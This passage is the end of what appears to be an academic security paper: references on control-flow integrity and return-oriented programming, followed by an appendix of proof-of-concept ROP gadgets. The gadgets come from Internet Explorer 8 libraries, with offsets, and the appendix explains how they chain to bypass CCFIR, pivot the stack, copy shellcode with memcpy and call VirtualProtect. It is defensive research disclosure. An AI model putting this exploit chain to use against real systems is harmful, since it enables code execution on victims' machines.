control-ﬂow attacks on smartphones,” in Proceedings of the 19th Annual
Network and Distributed System Security Symposium, February 2012.
[19] R. Wahbe, S. Lucco, T. E. Anderson, and S. L. Graham, “Efﬁcient
software-based fault isolation,” in Proceedings of the 14th ACM Sym-
posium on Operating Systems Principles, 1993, pp. 203–216.
[20] B. Zeng, G. Tan, and G. Morrisett, “Combining control-ﬂow integrity
and static analysis for efﬁcient and validated data sandboxing,” in
Proceedings of the 18th ACM conference on Computer and Commu-
nications Security, 2011, pp. 29–40.
[21] A. Pelletier, “Advanced exploitation of Internet Explorer heap overﬂow
(Pwn2Own 2012 exploit),” VUPEN Vulnerability Research Team (VRT)
Blog,
July 2012, http://www.vupen.com/blog/20120710.Advanced_
Exploitation_of_Internet_Explorer_HeapOv_CVE-2012-1876.php.
[22] Vendicator, “StackShield,” http://www.angelﬁre.com/sk/stackshield/.
[23] M. Hind, “Pointer analysis: haven’t we solved this problem yet?”
in Proceedings of the 2001 ACM SIGPLAN-SIGSOFT workshop on
Program analysis for software tools and engineering, 2001, pp. 54–61.
J. Li, Z. Wang, X. Jiang, M. Grace, and S. Bahram, “Defeating return-
oriented rootkits with return-less kernels,” in Proceedings of the 5th
European conference on Computer systems, 2010, pp. 195–208.
[24]
[25] A. Sotirov, “Heap feng shui in javascript,” Black Hat Europe, 2007.
[26] Pakt, “Ropc - a turing complete rop compiler,” https://github.com/pakt/
ropc.
[27] E. Buchanan, R. Roemer, H. Shacham, and S. Savage, “When good in-
structions go bad: Generalizing return-oriented programming to RISC,”
in Proceedings of CCS 2008, P. Syverson and S. Jha, Eds. ACM Press,
Oct. 2008, pp. 27–38.
[28] Corelan, “Mona: a debugger plugin / exploit development swiss army
knife,” http://redmine.corelan.be/projects/mona, 2011.
[29] N. Joly, “Technical analysis and advanced exploitation of Adobe Flash
0-day (CVE-2011-0609),” VUPEN Vulnerability Research Team (VRT)
Blog, March 2011, http://www.vupen.com/blog/20110326.Technical_
Analysis_and_Win7_Exploitation_Adobe_Flash_0Day_CVE-2011-
0609.php.
[30] H. Shacham, M. Page, B. Pfaff, E.-J. Goh, N. Modadugu, and D. Boneh,
“On the effectiveness of address-space randomization,” in Proceedings
of the 11th ACM conference on Computer and Communications Secu-
rity, 2004, pp. 298–307.
[31] N. Joly, “Criminals are getting smarter: Analysis of
the Adobe
Acrobat/Reader 0-day exploit,” VUPEN Vulnerability Research
Team (VRT) Blog, September 2009, http://www.vupen.com/blog/
20100909.Adobe_Acrobat_Reader_0_Day_Exploit_CVE-2010-
2883_Technical_Analysis.php.
[32] A. V. Aho, M. S. Lam, R. Sethi, and J. D. Ullman, Compilers:
Principles, Techniques, & Tools. Addison Wesley, 2006.
[33] DarkReading, “Heap spraying: Attackers’ latest weapon of choice,”
http://www.darkreading.com/security/vulnerabilities/showArticle.jhtml?
articleID=221901428, November 2009.
[34] V. Pappas, M. Polychronakis, and A. D. Keromytis, “Transparent ROP
exploit mitigation using indirect branch tracing,” in Proceedings of the
22nd USENIX Security Symposium, 2013, pp. 447–462.
[35] K. Onarlioglu, L. Bilge, A. Lanzi, D. Balzarotti, and E. Kirda, “G-Free:
Defeating return-oriented programming through gadget-less binaries,”
in Proceedings of the 26th Annual Computer Security Applications
Conference, 2010, pp. 49–58.
[36] M. Frantzen and M. Shuey, “StackGhost: Hardware facilitated stack
protection,” in Proceedings of the 10th USENIX Security Symposium,
August 2001, pp. 55–66.
[37] L. Davi, A.-R. Sadeghi, and M. Winandy, “ROPdefender: A detection
tool to defend against return-oriented programming attacks,” in Pro-
ceedings of the 6th ACM ASIACCS, 2011, pp. 40–51.
[38] T. Bletsch, X. Jiang, and V. Freeh, “Mitigating code-reuse attacks with
control-ﬂow locking,” in Proceedings of the 27th Annual Computer
Security Applications Conference, 2011, pp. 353–362.
[39] V. Pappas, M. Polychronakis, and A. D. Keromytis, “Smashing the
gadgets: Hindering return-oriented programming using in-place code
randomization,” in Proceedings of
the 2012 IEEE Symposium on
Security and Privacy, 2012, pp. 601–615.
J. Hiser, A. Nguyen-Tuong, M. Co, M. Hall, and J. W. Davidson, “ILR:
Where’d my gadgets go?” in Proceedings of the 2012 IEEE Symposium
on Security and Privacy, 2012, pp. 571–585.
[40]
[41] R. Wartell, V. Mohan, K. W. Hamlen, and Z. Lin, “Binary stirring:
Self-randomizing instruction addresses of legacy x86 binary code,” in
Proceedings of the 2012 ACM conference on Computer and communi-
cations security. ACM, 2012, pp. 157–168.
J. Pewny and T. Holz, “Control-ﬂow restrictor: Compiler-based CFI for
iOS,” in Proceedings of the 29th Annual Computer Security Applica-
tions Conference, 2013.
[42]
[43] K. Anand, M. Smithson, K. Elwazeer, A. Kotha, J. Gruen, N. Giles, and
R. Barua, “A compiler-level intermediate representation based binary
analysis and rewriting system,” in EuroSys, 2013, pp. 295–308.
[44] E. J. Schwartz, J. Lee, M. Woo, and D. Brumley, “Native x86 de-
compilation using semantics-preserving structural analysis and iterative
control-ﬂow structuring,” in Proceedings of the USENIX Security Sym-
posium, 2013.
[45] B. Yee, D. Sehr, G. Dardyk, J. B. Chen, R. Muth, T. Orm, S. Okasaka,
N. Narula, N. Fullagar, and G. Inc, “Native Client: A Sandbox for
Portable, Untrusted x86 Native Code,” in Proceedings of the 2007 IEEE
Symposium on Security and Privacy, 2009.
[46] D. Sehr, R. Muth, C. Bifﬂe, V. Khimenko, E. Pasko, K. Schimpf,
B. Yee, and B. Chen, “Adapting software fault isolation to contemporary
cpu architectures,” in Proceedings of the 19th USENIX conference on
Security, 2010.
[47] U. Erlingsson, M. Abadi, M. Vrable, M. Budiu, and G. C. Necula, “Xﬁ:
Software guards for system address spaces,” in Proceedings of the 7th
Symposium on Operating Systems Design and Implementation, 2006,
pp. 75–88.
[48] P. Akritidis, C. Cadar, C. Raiciu, M. Costa, and M. Castro, “Preventing
memory error exploits with wit,” in IEEE Symposium on Security and
Privacy, 2008, pp. 263–277.
587
Authorized licensed use limited to: IEEE Xplore. Downloaded on March 18,2021 at 12:01:49 UTC from IEEE Xplore.  Restrictions apply. 
APPENDIX
A. PoC Exploit Gadgets
; library: mshtml.dll
; offset: 0x001BC907
1 mov
2 mov
3 mov
4 jmp
ecx, [ecx+24h]
eax, [ecx]
edx, [eax+24h]
edx
Gadget 0-1: (Phase 0, Gadget 1). The few instructions
executed before the ﬁrst controlled indirect control-transfer
instruction. First ecx gets loaded with a pointer to the button
object in the heap (line 1) and then eax gets loaded with the
object’s vtable pointer which is overwritten with a pointer
to our buffer by using the heap buffer overﬂow vulnerability
in Internet Explorer 8. Our buffer contains the data required
to guide the process in performing a code injection exploit.
Because we assume CCFIR is in place, the target of the jmp
instruction must be an entry point (see Gadget 1-4).
; library: ieframe.dll
; offset:
; type:
0x002B6D88
EP-IC-R
1 mov
2 push
3 mov
4 mov
5 push
6 mov
7 push
8 push
9 call
10 test
11 jge
12 mov
13 pop
14 retn
edi, edi
ebp
ebp, esp
eax, [ebp+8]
dword ptr [ebp+0Ch]
ecx, [eax]
dword ptr [eax+0Ch] ; push return address
eax
dword ptr [ecx+10h]
eax, eax
short loc_76836DA5 ; if eax >= 0:---+
eax, 80004005h
;
|
ebp
; <--------------+
8
Gadget 1-1: (Phase 1, Gadget 1). The main gadget used to
transfer control from an indirect call to a return instruction.
The instruction at line 7 pushes the return address to the
stack. If we can point eax and the data at eax+0Ch to
the sprayed buffer, we can make the function return to our
desired address. Notice, that eax is loaded from the stack
(line 4), which we can poison by feeding the right arguments
when calling this gadget with an indirect call. In the same
fashion, we can call a second gadget by pointing ecx in the
sprayed buffer through eax (line 6). The latter is presented
in Gadget 1-2.
; library: ieframe.dll
; offset:
; type:
0x000A647C
EP-R
1 mov
2 retn
eax, [ecx+74h]
Gadget 1-2: (Phase 1, Gadget 2). This gadget removes only
the return address from the stack. By breaking the caller’s
assumptions, at
its return
instruction will point to our desired return address, which
we have pushed on the stack by means of registers that point
to the sprayed buffer (see Gadget 1-1).
the caller returns,
the moment
; library: ieframe.dll
; offset:
; type:
0x002869F0
EP-IC
1 mov
2 push
3 mov
4 mov
5 push
6 call
...
edi, edi
esi
esi, ecx
eax, [esi]
edi
dword ptr [eax+0C4h]
; callee’s argument
Gadget 1- 3: (Phase 1, Gadget 3). The main gadget (see
Gadget 1-1) requires a pointer to the buffer as an argument
on the stack so we use this gadget to satisfy this requirement.
However, this gadget is based on edi, which we have not yet
deﬁned. Therefore we use the last gadget of this phase, which
is presented in Gadget 1-4.
; library: ieframe.dll
; offset:
; type:
0x0030B665
EP-IC
1 mov
2 push
3 mov
4 push
5 push
6 mov
7 push
8 mov
9 call
...
edi, edi
ebp
ebp, esp
ebx
esi
esi, ecx
edi
edi, [esi]
dword ptr [edi+14h]
; edi pointer to buffer
Gadget 1-4: (Phase 1, Gadget 4). This gadget deﬁnes edi, as
needed by Gadget 1-3 using esi, which is loaded with ecx
which we already control (see Gadget 0-1).
; library: mshtml.dll
0x0042E9D9
; offset:
; type:
CS-R
edi
esi
esp, ebp
ebp
20h
1 pop
2 pop
3 mov
4 pop
5 retn
Gadget 2-1: (Phase 2, Gadget 1). Point esp to the sprayed
buffer.
; library: mshtml.dll
0x004A73E3
; offset:
; type:
CS-R
14h
1 retn
Gadget 2- 2: (Phase 2, Gadget 2). Further increase esp by
0x18 (6 dwords).
; library: ieframe.dll
; offset:
; type:
0x001ADCC2
CS-F-R
; destination
1 push
2 call
3 add
4 xor
5 jmp
6 pop
7 pop
8 pop
9 pop
eax
memcpy
esp, 0Ch
eax, eax
short loc_7672DCE7
ebx
edi
esi
ebp
8
10 retn
Gadget 3-1: (Phase 3, Gadget 1). Gadget for calling of
memcpy for copying the shellcode to existing program code.
588
Authorized licensed use limited to: IEEE Xplore. Downloaded on March 18,2021 at 12:01:49 UTC from IEEE Xplore.  Restrictions apply. 
; library: ieframe.dll
; offset:
; type:
0x0006FBAE
CS-F-R
; address to save old protection
; new protection
; size
; address
1 and
2 lea
3 push
4 push
5 push
6 mov
7 push
8 call
9 test
dword ptr [ebp-0Ch], 0
eax, [ebp-0Ch]
eax
40h
ebx
ebx, [ebp-8]
ebx
ds:VirtualProtect
eax, eax
loc_766E9531 ; if eax==0: goto error handler
eax, [ebp+8]
dword ptr [edi+4], 0
[edi+8], eax
[edi+10h], esi
[edi+0Ch], ebx
eax, [ebp-0Ch]
[edi+14h], eax
eax, dword_768E2CCC
[edi], eax
dword_768E2CCC, edi
eax, eax
edi
ebx
esi
10 jz
11 mov
12 and
13 mov
14 mov
15 mov
16 mov
17 mov
18 mov
19 mov
20 mov
21 xor
22 pop
23 pop
24 pop
25 leave
26 retn
14h
Gadget 3- 2:
for calling
VirtualProtect and making existing program code writable.
(Phase 3, Gadget 2). Gadget
; == mov esp, ebp and pop ebp
589
Authorized licensed use limited to: IEEE Xplore. Downloaded on March 18,2021 at 12:01:49 UTC from IEEE Xplore.  Restrictions apply.